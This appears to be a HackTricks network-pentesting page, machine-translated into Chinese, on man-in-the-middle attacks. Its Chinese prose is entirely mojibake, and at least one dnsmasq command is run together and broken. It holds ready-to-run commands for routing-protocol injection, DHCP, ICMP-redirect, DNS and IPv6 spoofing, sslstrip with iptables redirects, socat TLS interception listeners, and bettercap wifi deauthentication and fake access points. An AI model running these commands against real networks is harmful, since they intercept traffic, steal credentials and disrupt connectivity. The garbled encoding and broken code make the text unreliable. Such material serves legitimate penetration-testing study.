å·²çŸ¥å­˜åœ¨ä¸‰ç§è·¯ç”±ä¿¡æ¯åè®®ï¼ˆRIPï¼‰çš„ç‰ˆæœ¬ï¼šRIPã€RIPv2å’ŒRIPngã€‚RIPå’ŒRIPv2é€šè¿‡UDPçš„520ç«¯å£å‘å¯¹ç­‰ä½“å‘é€æ•°æ®æŠ¥ï¼Œè€ŒRIPngåˆ™é€šè¿‡IPv6ç»„æ’­å‘UDPçš„521ç«¯å£å¹¿æ’­æ•°æ®æŠ¥ã€‚RIPv2å¼•å…¥äº†å¯¹MD5èº«ä»½éªŒè¯çš„æ”¯æŒã€‚å¦ä¸€æ–¹é¢ï¼ŒRIPngæ²¡æœ‰åŒ…å«æœ¬åœ°èº«ä»½éªŒè¯ï¼›ç›¸åï¼Œå®ƒä¾èµ–äºIPv6ä¸­çš„å¯é€‰IPsec AHå’ŒESPå¤´ã€‚

* **RIPå’ŒRIPv2ï¼š** é€šè¿‡UDPæ•°æ®æŠ¥åœ¨520ç«¯å£è¿›è¡Œé€šä¿¡ã€‚
* **RIPngï¼š** åˆ©ç”¨UDPçš„521ç«¯å£é€šè¿‡IPv6ç»„æ’­å¹¿æ’­æ•°æ®æŠ¥ã€‚

è¯·æ³¨æ„ï¼ŒRIPv2æ”¯æŒMD5èº«ä»½éªŒè¯ï¼Œè€ŒRIPngä¸åŒ…æ‹¬æœ¬åœ°èº«ä»½éªŒè¯ï¼Œä¾èµ–äºIPv6ä¸­çš„IPsec AHå’ŒESPå¤´ã€‚

### EIGRP æ”»å‡»

**EIGRPï¼ˆå¢å¼ºå‹å†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰**æ˜¯ä¸€ç§åŠ¨æ€è·¯ç”±åè®®ã€‚**å®ƒæ˜¯ä¸€ç§è·ç¦»çŸ¢é‡åè®®ã€‚** å¦‚æœæ²¡æœ‰**èº«ä»½éªŒè¯**å’Œè¢«åŠ¨æ¥å£çš„é…ç½®ï¼Œ**å…¥ä¾µè€…**å¯ä»¥å¹²æ‰°EIGRPè·¯ç”±å¹¶å¯¼è‡´**è·¯ç”±è¡¨ä¸­æ¯’**ã€‚æ­¤å¤–ï¼ŒEIGRPç½‘ç»œï¼ˆæ¢å¥è¯è¯´ï¼Œè‡ªæ²»ç³»ç»Ÿï¼‰**æ˜¯æ‰å¹³çš„ï¼Œæ²¡æœ‰åˆ’åˆ†ä¸ºä»»ä½•åŒºåŸŸ**ã€‚å¦‚æœ**æ”»å‡»è€…æ³¨å…¥ä¸€æ¡è·¯ç”±**ï¼Œè¿™æ¡è·¯ç”±å¾ˆå¯èƒ½ä¼š**ä¼ æ’­**åˆ°æ•´ä¸ªè‡ªæ²»EIGRPç³»ç»Ÿã€‚

æ”»å‡»EIGRPç³»ç»Ÿéœ€è¦**ä¸åˆæ³•EIGRPè·¯ç”±å™¨å»ºç«‹é‚»å±…å…³ç³»**ï¼Œè¿™æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ï¼Œä»åŸºæœ¬ä¾¦å¯Ÿåˆ°å„ç§æ³¨å…¥ã€‚

[**FRRouting**](https://frrouting.org/) å…è®¸æ‚¨å®ç°**æ”¯æŒBGPã€OSPFã€EIGRPã€RIPå’Œå…¶ä»–åè®®çš„è™šæ‹Ÿè·¯ç”±å™¨ã€‚** æ‚¨åªéœ€åœ¨æ”»å‡»è€…çš„ç³»ç»Ÿä¸Šéƒ¨ç½²å®ƒï¼Œæ‚¨å®é™…ä¸Šå¯ä»¥å‡è£…æˆä¸ºè·¯ç”±åŸŸä¸­çš„åˆæ³•è·¯ç”±å™¨ã€‚

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) å…·æœ‰æ‹¦æˆªEIGRPï¼ˆå¢å¼ºå‹å†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰å¹¿æ’­çš„èƒ½åŠ›ã€‚å®ƒè¿˜å…è®¸æ³¨å…¥æ•°æ®åŒ…ï¼Œè¿™å¯ä»¥ç”¨äºæ›´æ”¹è·¯ç”±é…ç½®ã€‚

### OSPF

åœ¨å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼ˆOSPFï¼‰åè®®ä¸­ï¼Œ**é€šå¸¸ä½¿ç”¨MD5èº«ä»½éªŒè¯æ¥ç¡®ä¿è·¯ç”±å™¨ä¹‹é—´çš„å®‰å…¨é€šä¿¡**ã€‚ç„¶è€Œï¼Œè¿™ä¸€å®‰å…¨æªæ–½å¯ä»¥é€šè¿‡åƒLokiå’ŒJohn the Ripperè¿™æ ·çš„å·¥å…·è¢«ç ´åã€‚è¿™äº›å·¥å…·èƒ½å¤Ÿæ•è·å’Œç ´è§£MD5å“ˆå¸Œï¼Œæš´éœ²èº«ä»½éªŒè¯å¯†é’¥ã€‚ä¸€æ—¦è·å¾—è¯¥å¯†é’¥ï¼Œå°±å¯ä»¥ç”¨æ¥å¼•å…¥æ–°çš„è·¯ç”±ä¿¡æ¯ã€‚è¦é…ç½®è·¯ç”±å‚æ•°å¹¶å»ºç«‹è¢«ç ´åçš„å¯†é’¥ï¼Œåˆ†åˆ«ä½¿ç”¨_æ³¨å…¥_å’Œ_è¿æ¥_é€‰é¡¹å¡ã€‚

* **æ•è·å’Œç ´è§£MD5å“ˆå¸Œï¼š** ä½¿ç”¨Lokiå’ŒJohn the Ripperç­‰å·¥å…·ã€‚
* **é…ç½®è·¯ç”±å‚æ•°ï¼š** é€šè¿‡_æ³¨å…¥_é€‰é¡¹å¡è¿›è¡Œã€‚
* **è®¾ç½®è¢«ç ´åçš„å¯†é’¥ï¼š** å¯†é’¥åœ¨_è¿æ¥_é€‰é¡¹å¡ä¸‹é…ç½®ã€‚

### å…¶ä»–é€šç”¨å·¥å…·å’Œèµ„æº

* [**Above**](https://github.com/c4s73r/Above)ï¼šæ‰«æç½‘ç»œæµé‡å¹¶æŸ¥æ‰¾æ¼æ´çš„å·¥å…·
* æ‚¨å¯ä»¥åœ¨[**è¿™é‡Œ**](https://github.com/Sab0tag3d/MITM-cheatsheet)æ‰¾åˆ°ä¸€äº›**å…³äºç½‘ç»œæ”»å‡»çš„æ›´å¤šä¿¡æ¯**ã€‚

## **æ¬ºéª—**

æ”»å‡»è€…é€šè¿‡å‘é€è™šå‡çš„DHCPå“åº”æ¥é…ç½®ç½‘ç»œä¸­æ–°æˆå‘˜çš„æ‰€æœ‰ç½‘ç»œå‚æ•°ï¼ˆGWã€IPã€DNSï¼‰ã€‚
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

æŸ¥çœ‹[ä¸Šä¸€èŠ‚](./#arp-spoofing)ã€‚

### ICMPRedirect

ICMPé‡å®šå‘æ˜¯æŒ‡å‘é€ä¸€ä¸ªICMPæ•°æ®åŒ…ç±»å‹1ä»£ç 5ï¼Œè¡¨ç¤ºæ”»å‡»è€…æ˜¯åˆ°è¾¾æŸä¸ªIPçš„æœ€ä½³æ–¹å¼ã€‚ç„¶åï¼Œå½“å—å®³è€…æƒ³è¦è”ç³»è¯¥IPæ—¶ï¼Œå®ƒå°†é€šè¿‡æ”»å‡»è€…å‘é€æ•°æ®åŒ…ã€‚
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

æ”»å‡»è€…å°†è§£æå—å®³è€…è¯·æ±‚çš„æŸäº›ï¼ˆæˆ–æ‰€æœ‰ï¼‰åŸŸåã€‚
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**ä½¿ç”¨ dnsmasq é…ç½®è‡ªå·±çš„ DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### æœ¬åœ°ç½‘å…³

ç³»ç»Ÿå’Œç½‘ç»œé€šå¸¸å­˜åœ¨å¤šä¸ªè·¯ç”±ã€‚åœ¨æœ¬åœ°ç½‘ç»œä¸­å»ºç«‹ MAC åœ°å€åˆ—è¡¨åï¼Œä½¿ç”¨ _gateway-finder.py_ æ¥è¯†åˆ«æ”¯æŒ IPv4 è½¬å‘çš„ä¸»æœºã€‚
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

å¯¹äºå½“ DNS æŸ¥è¯¢å¤±è´¥æ—¶çš„æœ¬åœ°ä¸»æœºè§£æï¼ŒMicrosoft ç³»ç»Ÿä¾èµ–äº **Link-Local Multicast Name Resolution (LLMNR)** å’Œ **NetBIOS Name Service (NBT-NS)**ã€‚ç±»ä¼¼åœ°ï¼Œ**Apple Bonjour** å’Œ **Linux zero-configuration** å®ç°åˆ©ç”¨ **Multicast DNS (mDNS)** åœ¨ç½‘ç»œå†…å‘ç°ç³»ç»Ÿã€‚ç”±äºè¿™äº›åè®®çš„æ— è®¤è¯ç‰¹æ€§åŠå…¶é€šè¿‡ UDP å¹¿æ’­æ¶ˆæ¯çš„æ“ä½œï¼Œå®ƒä»¬å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œæ—¨åœ¨å°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ Responder å†’å……è¢«ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€è™šå‡å“åº”ã€‚\
åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äº [å¦‚ä½•ä½¿ç”¨ Responder å†’å……æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) çš„ä¿¡æ¯ã€‚

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

æµè§ˆå™¨é€šå¸¸ä½¿ç”¨ **Web Proxy Auto-Discovery (WPAD) åè®®è‡ªåŠ¨è·å–ä»£ç†è®¾ç½®**ã€‚è¿™æ¶‰åŠä»æœåŠ¡å™¨è·å–é…ç½®ç»†èŠ‚ï¼Œå…·ä½“é€šè¿‡ä¸€ä¸ª URLï¼Œä¾‹å¦‚ "http://wpad.example.org/wpad.dat"ã€‚å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡å„ç§æœºåˆ¶å‘ç°æ­¤æœåŠ¡å™¨ï¼š

* é€šè¿‡ **DHCP**ï¼Œå…¶ä¸­å‘ç°é€šè¿‡ä½¿ç”¨ç‰¹æ®Šä»£ç  252 æ¡ç›®æ¥ä¿ƒè¿›ã€‚
* é€šè¿‡ **DNS**ï¼Œè¿™æ¶‰åŠåœ¨æœ¬åœ°åŸŸä¸­æœç´¢æ ‡è®°ä¸º _wpad_ çš„ä¸»æœºåã€‚
* é€šè¿‡ **Microsoft LLMNR å’Œ NBT-NS**ï¼Œè¿™äº›æ˜¯ DNS æŸ¥è¯¢æœªæˆåŠŸæ—¶ä½¿ç”¨çš„åå¤‡æœºåˆ¶ã€‚

å·¥å…· Responder åˆ©ç”¨æ­¤åè®®ï¼Œå……å½“ **æ¶æ„ WPAD æœåŠ¡å™¨**ã€‚å®ƒä½¿ç”¨ DHCPã€DNSã€LLMNR å’Œ NBT-NS è¯¯å¯¼å®¢æˆ·ç«¯è¿æ¥åˆ°å®ƒã€‚è¦æ·±å…¥äº†è§£å¦‚ä½•ä½¿ç”¨ Responder å†’å……æœåŠ¡ [è¯·æŸ¥çœ‹è¿™ä¸ª](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ã€‚

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

æ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­æä¾›ä¸åŒçš„æœåŠ¡ï¼Œä»¥å°è¯• **æ¬ºéª—ç”¨æˆ·** è¾“å…¥ä¸€äº› **æ˜æ–‡å‡­æ®**ã€‚**å…³äºæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯åœ¨** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**ã€‚**

### IPv6 Neighbor Spoofing

æ­¤æ”»å‡»ä¸ ARP Spoofing éå¸¸ç›¸ä¼¼ï¼Œä½†åœ¨ IPv6 ä¸–ç•Œä¸­ã€‚æ‚¨å¯ä»¥è®©å—å®³è€…è®¤ä¸º GW çš„ IPv6 æ‹¥æœ‰æ”»å‡»è€…çš„ MACã€‚
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 è·¯ç”±å™¨å¹¿å‘Šæ¬ºéª—/æ´ªæ°´æ”»å‡»

ä¸€äº›æ“ä½œç³»ç»Ÿé»˜è®¤é€šè¿‡ç½‘ç»œä¸­å‘é€çš„ RA æ•°æ®åŒ…é…ç½®ç½‘å…³ã€‚è¦å°†æ”»å‡»è€…å£°æ˜ä¸º IPv6 è·¯ç”±å™¨ï¼Œå¯ä»¥ä½¿ç”¨ï¼š
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›æ“ä½œç³»ç»Ÿå°è¯•é€šè¿‡è¯»å–ç½‘ç»œä¸­çš„DHCPv6æ•°æ®åŒ…æ¥é…ç½®DNSã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªDHCPv6æ•°æ®åŒ…ï¼Œå°†è‡ªå·±é…ç½®ä¸ºDNSã€‚DHCPè¿˜ä¸ºå—å®³è€…æä¾›äº†ä¸€ä¸ªIPv6åœ°å€ã€‚
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (å‡é¡µé¢å’ŒJSä»£ç æ³¨å…¥)

## äº’è”ç½‘æ”»å‡»

### sslStrip

åŸºæœ¬ä¸Šï¼Œè¿™ç§æ”»å‡»çš„ä½œç”¨æ˜¯ï¼Œå½“**ç”¨æˆ·**å°è¯•**è®¿é—®**ä¸€ä¸ª**HTTP**é¡µé¢ï¼Œè¯¥é¡µé¢**é‡å®šå‘**åˆ°**HTTPS**ç‰ˆæœ¬æ—¶ï¼Œ**sslStrip**å°†**ä¿æŒ**ä¸**å®¢æˆ·ç«¯çš„HTTPè¿æ¥**å’Œä¸**æœåŠ¡å™¨çš„HTTPSè¿æ¥**ï¼Œè¿™æ ·å®ƒå°±èƒ½å¤Ÿä»¥**æ˜æ–‡**æ–¹å¼**å—…æ¢**è¿æ¥ã€‚
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
æ›´å¤šä¿¡æ¯ [è¿™é‡Œ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)ã€‚

### sslStrip+ å’Œ dns2proxy ç»•è¿‡ HSTS

**sslStrip+ å’Œ dns2proxy** ä¸ **sslStrip** çš„**åŒºåˆ«**åœ¨äºå®ƒä»¬ä¼š**é‡å®šå‘**ä¾‹å¦‚ _**www.facebook.com**_ **åˆ°** _**wwww.facebook.com**_ï¼ˆæ³¨æ„**å¤šäº†ä¸€ä¸ª**â€œ**w**â€ï¼‰ï¼Œå¹¶å°†**è¯¥åŸŸåçš„åœ°å€è®¾ç½®ä¸ºæ”»å‡»è€… IP**ã€‚è¿™æ ·ï¼Œ**å®¢æˆ·ç«¯**å°†**è¿æ¥**åˆ° _**wwww.facebook.com**_ **ï¼ˆæ”»å‡»è€…ï¼‰**ï¼Œä½†åœ¨åå°**sslstrip+**å°†**é€šè¿‡ https ç»´æŒ**ä¸ **www.facebook.com** çš„**çœŸå®è¿æ¥**ã€‚

æ­¤æŠ€æœ¯çš„**ç›®æ ‡**æ˜¯**é¿å… HSTS**ï¼Œå› ä¸º _**wwww**.facebook.com_ **ä¸ä¼š**è¢«ä¿å­˜åœ¨**æµè§ˆå™¨çš„ç¼“å­˜**ä¸­ï¼Œå› æ­¤æµè§ˆå™¨ä¼šè¢«æ¬ºéª—ä»¥åœ¨ HTTP ä¸­æ‰§è¡Œ**facebook è®¤è¯**ã€‚\
è¯·æ³¨æ„ï¼Œä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå—å®³è€…å¿…é¡»æœ€åˆå°è¯•è®¿é—® [http://www.faceook.com](http://www.faceook.com)ï¼Œè€Œä¸æ˜¯ httpsã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹ http é¡µé¢ä¸­çš„é“¾æ¥æ¥å®ç°ã€‚

æ›´å¤šä¿¡æ¯ [è¿™é‡Œ](https://www.bettercap.org/legacy/#hsts-bypass)ï¼Œ[è¿™é‡Œ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) å’Œ [è¿™é‡Œ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)ã€‚

**sslStrip æˆ– sslStrip+ ä¸å†æœ‰æ•ˆã€‚è¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¸­é¢„å…ˆä¿å­˜äº† HSTS è§„åˆ™ï¼Œå› æ­¤å³ä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®â€œé‡è¦â€åŸŸåï¼Œä»–ä¹Ÿä¼šé€šè¿‡ HTTPS è®¿é—®ã€‚æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œé¢„å…ˆä¿å­˜çš„è§„åˆ™å’Œå…¶ä»–ç”Ÿæˆçš„è§„åˆ™å¯ä»¥ä½¿ç”¨æ ‡å¿—** [**`includeSubdomains`**](https://hstspreload.appspot.com) **ï¼Œå› æ­¤ä¹‹å‰çš„ _**wwww.facebook.com**_ **ç¤ºä¾‹å°†ä¸å†æœ‰æ•ˆï¼Œå› ä¸º** _**facebook.com**_ **ä½¿ç”¨ HSTS å’Œ `includeSubdomains`ã€‚**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP ç›‘å¬ç«¯å£
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL åœ¨ç«¯å£ç›‘å¬

#### ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### ä½¿ç”¨è¯ä¹¦ç›‘å¬
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
æœ‰æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯æ£€æŸ¥CAæ˜¯æœ‰æ•ˆçš„ï¼Œæ‚¨å¯ä»¥**æä¾›ç”±CAç­¾åçš„å…¶ä»–ä¸»æœºåçš„è¯ä¹¦**ã€‚\
å¦ä¸€ä¸ªæœ‰è¶£çš„æµ‹è¯•æ˜¯**æä¾›è¯·æ±‚çš„ä¸»æœºåä½†è‡ªç­¾åçš„è¯ä¹¦**ã€‚

å…¶ä»–æµ‹è¯•å†…å®¹æ˜¯å°è¯•ç”¨ä¸€ä¸ªæœ‰æ•ˆçš„è¯ä¹¦ç­¾ç½²è¯¥è¯ä¹¦ï¼Œä½†è¯¥è¯ä¹¦ä¸æ˜¯æœ‰æ•ˆçš„CAã€‚æˆ–è€…ä½¿ç”¨æœ‰æ•ˆçš„å…¬é’¥ï¼Œå¼ºåˆ¶ä½¿ç”¨ä¸€ç§ç®—æ³•ï¼Œå¦‚Diffie-Hellmanï¼ˆä¸éœ€è¦ç”¨çœŸå®ç§é’¥è§£å¯†çš„ç®—æ³•ï¼‰ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚çœŸå®ç§é’¥çš„æ¢æµ‹ï¼ˆå¦‚å“ˆå¸Œï¼‰æ—¶ï¼Œå‘é€ä¸€ä¸ªå‡æ¢æµ‹ï¼Œå¹¶æœŸæœ›å®¢æˆ·ç«¯ä¸æ£€æŸ¥è¿™ä¸ªã€‚

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

è¯·æ³¨æ„ï¼Œå½“UDPæ•°æ®åŒ…å‘é€åˆ°æ²¡æœ‰è¯·æ±‚ç«¯å£çš„è®¾å¤‡æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªICMPï¼ˆç«¯å£ä¸å¯è¾¾ï¼‰æ¶ˆæ¯ã€‚

### **ARP discover**

ARPæ•°æ®åŒ…ç”¨äºå‘ç°ç½‘ç»œä¸­æ­£åœ¨ä½¿ç”¨çš„IPã€‚PCå¿…é¡»ä¸ºæ¯ä¸ªå¯èƒ½çš„IPåœ°å€å‘é€è¯·æ±‚ï¼Œåªæœ‰æ­£åœ¨ä½¿ç”¨çš„IPæ‰ä¼šå“åº”ã€‚

### **mDNS (multicast DNS)**

Bettercapæ¯éš”Xæ¯«ç§’å‘é€ä¸€ä¸ªMDNSè¯·æ±‚ï¼Œè¯¢é—®**\_services\_.dns-sd.\_udp.local**ï¼Œçœ‹åˆ°æ­¤æ•°æ®åŒ…çš„æœºå™¨é€šå¸¸ä¼šå›ç­”è¯¥è¯·æ±‚ã€‚ç„¶åï¼Œå®ƒåªæœç´¢å›ç­”â€œservicesâ€çš„æœºå™¨ã€‚

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercapå‘ç«¯å£137/UDPå¹¿æ’­æ•°æ®åŒ…ï¼Œè¯¢é—®åç§°â€œCKAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€ã€‚

### **SSDP (Simple Service Discovery Protocol)**

Bettercapå¹¿æ’­SSDPæ•°æ®åŒ…ï¼Œæœç´¢å„ç§æœåŠ¡ï¼ˆUDPç«¯å£1900ï¼‰ã€‚

### **WSD (Web Service Discovery)**

Bettercapå¹¿æ’­WSDæ•°æ®åŒ…ï¼Œæœç´¢æœåŠ¡ï¼ˆUDPç«¯å£3702ï¼‰ã€‚

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§**bug bountyå¹³å°**ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ï¼Œè®¿é—®[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ä»¬ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
